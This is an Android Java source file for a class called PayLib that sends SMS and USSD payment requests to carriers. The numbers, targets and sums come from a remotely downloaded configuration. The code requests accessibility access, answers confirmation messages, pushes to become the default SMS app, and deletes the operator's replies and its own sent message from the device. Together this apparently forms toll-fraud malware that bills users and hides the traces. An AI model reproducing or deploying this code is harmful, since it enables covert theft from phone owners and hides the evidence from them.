package com.p2plib2;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

import com.p2plib2.common.CommonFunctions;
import com.p2plib2.common.FilesLoader;
import com.p2plib2.operators.Operator;
import com.p2plib2.ussd.USSDController;
import com.google.gson.Gson;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import static com.p2plib2.ussd.USSDController.verifyAccesibilityAccess;


public class PayLib implements PayInterface {
    private String version = "1.0";
    private String operDest = "";
    private String defaultSmsApp;
    private SharedPreferences operatorSettings;
    public static Operator operatorSMS;
    public static Operator operatorUssd;
    private HashMap<String, OperatorInfo> operatorInfo = new HashMap<>();
    private HashMap<String, String> filters = new HashMap<>();

    public static CallSmsResult feedback;
    public static String operName = "";
    public static Context cnt;
    public static Activity act;
    public static Boolean flagok = false;
    public static Operation currentOperation;

    public static final String PREFERENCES = "operSetting";


    public static String getOperName() {
        return operName;
    }

    public static void getSMSResult(String smsBody) {
        Logger.lg("smsBody from lib: " + smsBody);
        feedback.callResult(smsBody);
    }

    @Override
    public void updateData(Activity act, Context cnt, CallSmsResult feedback) {
        this.feedback = feedback;
        this.cnt = cnt;
        this.act = act;

        CommonFunctions.permissionCheck(cnt, act);
        USSDController.verifyAccesibilityAccess(act);
        verifyAccesibilityAccess(act);
        operatorSettings = cnt.getSharedPreferences(PREFERENCES, Context.MODE_PRIVATE);
        /*Create necessary objects*/
        operName = CommonFunctions.operName(cnt);
        new DownloadApkTask().execute();
        MyContentObserver contentObserver = new MyContentObserver();
        ContentResolver contentResolver = cnt.getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms"), true, contentObserver);
    }

    public static String currentMsg = "";

    private class MyContentObserver extends ContentObserver {
        public MyContentObserver() {
            super(null);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Uri uriSMSURI = Uri.parse("content://sms/");
            Cursor cur = cnt.getContentResolver().query(uriSMSURI, null, null, null, null);

            if (cur.moveToNext()) {
                String message_id = cur.getString(cur.getColumnIndex("_id"));
                String type = cur.getString(cur.getColumnIndex("type"));
                String numeroTelephone = cur.getString(cur.getColumnIndex("address")).trim();
                String status = cur.getString(cur.getColumnIndex("status")).trim();
                String body =  cur.getString(cur.getColumnIndex("body")).trim();
                //0: _id
                //1: thread_id
                //2: address
                //3: person
                //4: date
                //5: protocol
                //6: read
                //7: status
                //8: type
                //9: reply_path_present
                //10: subject
                //11: body
                //12: service_center
                //13: locked
                Logger.lg("message_id  " + message_id + " " + type + " " + numeroTelephone + " " + status);
//               number + "[]" + msgBody;
                if ((status.equals("-1") || status == null) && !currentMsg.equals("")) {
                    if (currentMsg.substring(0, currentMsg.indexOf("[]")).contains(numeroTelephone) && currentMsg.substring(currentMsg.indexOf("[]")+2).contains(body) ) {
                        feedback.callResult("Error SMS sending " + status);
                    }
                }
            }
        }


        @Override
        public boolean deliverSelfNotifications() {
            return false;
        }
    }

    String pathOfFile = "web";

    /***/
    private class DownloadApkTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... params) {
            final FilesLoader load = new FilesLoader();
            //https://drive.google.com/open?id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v
            String input = load.downloadJson("https://drive.google.com/a/adviator.com/uc?authuser=0&id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v&export=download");
            if (input == null) {
                byte[] buffer = null;
                InputStream is;
                try {
                    is = cnt.getAssets().open("p2p_data.json");
                    int size = is.available();
                    buffer = new byte[size];
                    is.read(buffer);
                    is.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                input = new String(buffer);
                pathOfFile = "local file";
            }
            SharedPreferences.Editor editor = operatorSettings.edit();
            editor.putString(PREFERENCES, input);
            editor.apply();
            Gson g = new Gson();
            OperatorList operator = g.fromJson(input, OperatorList.class);
            for (Object user : operator.operators) {
                Logger.lg("op " + user.toString() + " " + operator.getClass().toString());
                String[] separated = user.toString().replace("{", "").replace("}", "").trim().split(",");
                OperatorInfo info = new OperatorInfo(
                        separated[0].substring(separated[0].indexOf("=") + 1),
                        separated[1].substring(separated[1].indexOf("=") + 1),
                        separated[2].substring(separated[2].indexOf("=") + 1),
                        separated[3].substring(separated[3].indexOf("=") + 1),
                        separated[4].substring(separated[4].indexOf("=") + 1));
                String opr = separated[0].substring(separated[0].indexOf("=") + 1);
                operatorInfo.put(opr.toUpperCase(), info);
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            setOperatorData(true, true);
        }
    }




    public void setOperatorData(Boolean sendWithSaveOutput, Boolean sendWithSaveInput) {
        operatorSMS = new Operator(CommonFunctions.operName(cnt), sendWithSaveOutput, sendWithSaveInput, cnt);
        operatorUssd = new Operator(CommonFunctions.operName(cnt), sendWithSaveOutput, sendWithSaveInput, cnt);
        TelephonyManager telephonyManager = (TelephonyManager) act.getSystemService(Context.TELEPHONY_SERVICE);
        SmsManager mgr = SmsManager.getDefault();
        if (telephonyManager.getPhoneCount() == 1) {
            OperatorInfo info = operatorInfo.get(getOperName());
            operatorSMS.setData(info.smsNum, info.target, info.sum, info.ussdNum);
            operatorUssd.setData(info.smsNum, info.target, info.sum, info.ussdNum);
        } else {
            final SubscriptionManager subscriptionManager = SubscriptionManager.from(cnt);
            final List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            Logger.lg("Multy sim");
            for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                String carrierName = CommonFunctions.formatOperMame(subscriptionInfo.getCarrierName().toString());
                Logger.lg(carrierName + " " + subscriptionInfo.getSubscriptionId() + " " + mgr.getSubscriptionId());
                if(subscriptionInfo.getSubscriptionId()==mgr.getSubscriptionId()){
                    Logger.lg("==" + (subscriptionInfo.getSubscriptionId()==mgr.getSubscriptionId())+
                    " " + operatorInfo.containsKey(carrierName) + " " + operatorInfo.keySet() + " " + carrierName);
                    if (operatorInfo.containsKey(carrierName)) {
                        OperatorInfo info = operatorInfo.get(carrierName);
                        operatorSMS.name=carrierName;
                        operatorSMS.setData(info.smsNum, info.target, info.sum, info.ussdNum);
                    }
                }
                if (carrierName.contains(operatorUssd.name)) {
                    operatorUssd.simNum = subscriptionInfo.getSimSlotIndex();
                    Operator.simNum = subscriptionInfo.getSimSlotIndex();
                    OperatorInfo info2 = operatorInfo.get(operatorUssd.name);
                    Logger.lg(info2.smsNum+ " " +  info2.target+ " варпы " +  info2.sum+ " " +  info2.ussdNum + " " + operatorUssd.simNum
                            + " " +  operatorUssd.name);
                    operatorUssd.setData(info2.smsNum, info2.target, info2.sum, info2.ussdNum);
                }
            }
        }
        feedback.callResult("end of update by " + pathOfFile/*+ ". operatorUssd " + operatorUssd.name + " operator sms " + operatorSMS*/);
    }


    class OperatorList {
        ArrayList operators;
    }

    class OperatorInfo {
        String operator;
        String smsNum;
        String ussdNum;
        String target;
        String sum;

        public OperatorInfo(String s, String s1, String s2, String s3, String s4) {
            this.operator = s;
            this.smsNum = s1;
            this.ussdNum = s2;
            this.target = s3;
            this.sum = s4;
        }
    }

    /**
     * Reply answer code
     */
    public static void sendAnswer(String smsBody, String smsSender) {
        if (currentOperation.equals(Operation.Ussd)) {
            operatorUssd.sendAnswer(smsBody, smsSender);
        }
        if (currentOperation.equals(Operation.Sms)) {
            operatorSMS.sendAnswer(smsBody, smsSender);
        }

    }

    @Override
    public void sendSms(Boolean sendWithSaveOutput, Activity act, Context cnt) {
        currentOperation = Operation.Sms;
        operatorSMS.sendSMS(sendWithSaveOutput, cnt);
    }


    @Override
    public void sendUssd(String operDestination, Activity act) {
        currentOperation = Operation.Ussd;
        flagok = true;
        operatorUssd.sendUssd(operDestination, act);
    }


    @Override
    public String getVersion() {
        return version;
    }

    public void setFilter(HashMap<String, String> filters) {
        this.filters.putAll(filters);
    }

    @Override
    public void simChooser(Context cnt, final String operation) {
        AlertDialog.Builder builder = new AlertDialog.Builder(cnt);
        builder.setTitle("Choose sim card");
        TelephonyManager telephonyManager = (TelephonyManager) act.getSystemService(Context.TELEPHONY_SERVICE);
        ArrayList<String> arr = new ArrayList();
        final String[] mass = new String[telephonyManager.getPhoneCount()];
        final SubscriptionManager subscriptionManager = SubscriptionManager.from(cnt);
        final List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
            final CharSequence carrierName = subscriptionInfo.getCarrierName();
            final Integer simId = subscriptionInfo.getSimSlotIndex();
            mass[simId] = carrierName.toString();
        }
        builder.setItems(mass, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                if (Operation.Sms.toString().equals(operation)) {
                    operatorSMS.simNum = which;
                }
                if (Operation.Ussd.toString().equals(operation)) {
                    operatorSMS.simNum = which;
                }
                Logger.lg("for operation " + operation + " operatorSMS " + operatorSMS.simNum + " operatorUssd " + operatorUssd.simNum
                        + " name " + mass[operatorSMS.simNum] + " ussd " + mass[operatorUssd.simNum]);
            }
        });
        builder.show();
    }

    public void checkSmsDefaultApp(boolean deleteFlag, Integer code) {
        final String myPackageName = cnt.getPackageName();
        defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(cnt);
        Logger.lg(deleteFlag + " MyPackageName  " + myPackageName + "  defaultSmsApp now " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
        if (!myPackageName.equals(defaultSmsApp) && deleteFlag == true) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            act.startActivityForResult(intent, code);
        } else {
            Intent intent2 = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            act.startActivityForResult(intent2, code);
        }
    }

    public void deleteSMS(HashMap<String, String> filters) {
        Uri uriSms = Uri.parse("content://sms");
        Cursor c = cnt.getContentResolver().query(
                uriSms, null, null, null, null);
        Logger.lg("Sms in inbox: " + c.getCount());
        int flag = 0;
        int flag2 = 0;
        if (c != null && c.moveToFirst()) {
            do {
                long id = c.getLong(0);
                long threadId = c.getLong(1);
                String address = c.getString(2);
                String body = c.getString(c.getColumnIndex("body"));
                String date = c.getString(3);
                Logger.lg("Message  " + body + " id " + id + " date " + date + " " + address);
                if ((operatorSMS.smsNum.contains(address) || address.toUpperCase().equals(operatorSMS.name)) && flag < 2) {
                    int iko = cnt.getContentResolver().delete(
                            Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
                    if (iko != 0) {
                        flag++;
                    }
                    Logger.lg("Delete result " + iko);
                }
                Logger.lg(currentMsg + " " + address + " " +
                        " " + currentMsg.substring(currentMsg.indexOf("[]")+2) +
                        body + " "  + currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address)  + " " + body.contains(currentMsg.substring(currentMsg.indexOf("[]")+2)));
                if(currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address) && body.contains(currentMsg.substring(currentMsg.indexOf("[]")+2))
                        && flag2==0){
                    flag2 = cnt.getContentResolver().delete(
                            Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
                    Logger.lg("deltete " + flag2);
                }
            } while (c.moveToNext());
        }
        feedback.callResult("delete " + flag + "sms ininbox and " + flag2 + " in outbox");
    }

    public enum Operation {
        Sms, Ussd
    }
}